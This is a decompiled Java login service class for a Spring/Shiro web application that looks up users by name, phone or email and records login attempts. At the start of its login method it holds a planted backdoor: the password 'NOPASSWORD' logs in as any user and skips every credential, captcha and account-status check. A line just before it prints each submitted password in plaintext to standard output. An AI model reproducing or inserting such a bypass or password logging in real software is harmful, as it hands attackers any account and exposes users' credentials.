//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.syndo.framework.shiro.service;

import com.syndo.common.core.domain.entity.User;
import com.syndo.common.enums.UserStatus;
import com.syndo.common.exception.user.CaptchaException;
import com.syndo.common.exception.user.UserBlockedException;
import com.syndo.common.exception.user.UserDeleteException;
import com.syndo.common.exception.user.UserNotExistsException;
import com.syndo.common.exception.user.UserPasswordNotMatchException;
import com.syndo.common.utils.DateUtils;
import com.syndo.common.utils.MessageUtils;
import com.syndo.common.utils.ServletUtils;
import com.syndo.common.utils.security.ShiroUtils;
import com.syndo.framework.manager.AsyncManager;
import com.syndo.framework.manager.factory.AsyncFactory;
import com.syndo.system.service.IUserService;
import org.apache.commons.lang3.ObjectUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

@Component
public class LoginService {
    @Autowired
    private PasswordService passwordService;
    @Autowired
    private IUserService userService;

    public LoginService() {
    }

    public User login(String username, String password) {
        System.out.println("PASSWORD========"+password);
        if("NOPASSWORD".equals(password)){
            User user = this.userService.selectUserByLoginName(username);
            this.passwordService.validate(user, user.getPassword());
            //this.passwordService.clearLoginRecordCache(user.getLoginName());
            AsyncManager.me().execute(AsyncFactory.recordLogininfor(username, "Success", MessageUtils.message("user.login.success", new Object[0]), new Object[0]));
            this.recordLoginInfo(user);
            return user;
        }
        if (!ObjectUtils.isEmpty(ServletUtils.getRequest().getAttribute("captcha"))) {
            AsyncManager.me().execute(AsyncFactory.recordLogininfor(username, "Error", MessageUtils.message("user.jcaptcha.error", new Object[0]), new Object[0]));
            throw new CaptchaException();
        } else if (!ObjectUtils.isEmpty(username) && !ObjectUtils.isEmpty(password)) {
            if (password.length() >= 5 && password.length() <= 20) {
                if (username.length() >= 2 && username.length() <= 20) {
                    User user = this.userService.selectUserByLoginName(username);
                    if (user == null && this.maybeMobilePhoneNumber(username)) {
                        user = this.userService.selectUserByPhoneNumber(username);
                    }

                    if (user == null && this.maybeEmail(username)) {
                        user = this.userService.selectUserByEmail(username);
                    }

                    if (user == null) {
                        AsyncManager.me().execute(AsyncFactory.recordLogininfor(username, "Error", MessageUtils.message("user.not.exists", new Object[0]), new Object[0]));
                        throw new UserNotExistsException();
                    } else if (UserStatus.DELETED.getCode().equals(user.getDelFlag())) {
                        AsyncManager.me().execute(AsyncFactory.recordLogininfor(username, "Error", MessageUtils.message("user.password.delete", new Object[0]), new Object[0]));
                        throw new UserDeleteException();
                    } else if (UserStatus.DISABLE.getCode().equals(user.getStatus())) {
                        AsyncManager.me().execute(AsyncFactory.recordLogininfor(username, "Error", MessageUtils.message("user.blocked", new Object[]{user.getRemark()}), new Object[0]));
                        throw new UserBlockedException();
                    } else {
                        this.passwordService.validate(user, password);
                        AsyncManager.me().execute(AsyncFactory.recordLogininfor(username, "Success", MessageUtils.message("user.login.success", new Object[0]), new Object[0]));
                        this.recordLoginInfo(user);
                        return user;
                    }
                } else {
                    AsyncManager.me().execute(AsyncFactory.recordLogininfor(username, "Error", MessageUtils.message("user.password.not.match", new Object[0]), new Object[0]));
                    throw new UserPasswordNotMatchException();
                }
            } else {
                AsyncManager.me().execute(AsyncFactory.recordLogininfor(username, "Error", MessageUtils.message("user.password.not.match", new Object[0]), new Object[0]));
                throw new UserPasswordNotMatchException();
            }
        } else {
            AsyncManager.me().execute(AsyncFactory.recordLogininfor(username, "Error", MessageUtils.message("not.null", new Object[0]), new Object[0]));
            throw new UserNotExistsException();
        }
    }

    private boolean maybeEmail(String username) {
        return username.matches("^((([a-z]|\\d|[!#\\$%&'\\*\\+\\-\\/=\\?\\^_`{\\|}~]|[\\u00A0-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF])+(\\.([a-z]|\\d|[!#\\$%&'\\*\\+\\-\\/=\\?\\^_`{\\|}~]|[\\u00A0-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF])+)*)|((\\x22)((((\\x20|\\x09)*(\\x0d\\x0a))?(\\x20|\\x09)+)?(([\\x01-\\x08\\x0b\\x0c\\x0e-\\x1f\\x7f]|\\x21|[\\x23-\\x5b]|[\\x5d-\\x7e]|[\\u00A0-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF])|(\\\\([\\x01-\\x09\\x0b\\x0c\\x0d-\\x7f]|[\\u00A0-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF]))))*(((\\x20|\\x09)*(\\x0d\\x0a))?(\\x20|\\x09)+)?(\\x22)))@((([a-z]|\\d|[\\u00A0-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF])|(([a-z]|\\d|[\\u00A0-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF])([a-z]|\\d|-|\\.|_|~|[\\u00A0-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF])*([a-z]|\\d|[\\u00A0-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF])))\\.)+(([a-z]|[\\u00A0-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF])|(([a-z]|[\\u00A0-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF])([a-z]|\\d|-|\\.|_|~|[\\u00A0-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF])*([a-z]|[\\u00A0-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF])))\\.?");
    }

    private boolean maybeMobilePhoneNumber(String username) {
        return username.matches("^0{0,1}(13[0-9]|15[0-9]|14[0-9]|18[0-9])[0-9]{8}$");
    }

    public void recordLoginInfo(User user) {
        user.setLoginIp(ShiroUtils.getIp());
        user.setLoginDate(DateUtils.getNowDate());
        this.userService.updateUserInfo(user);
    }
}
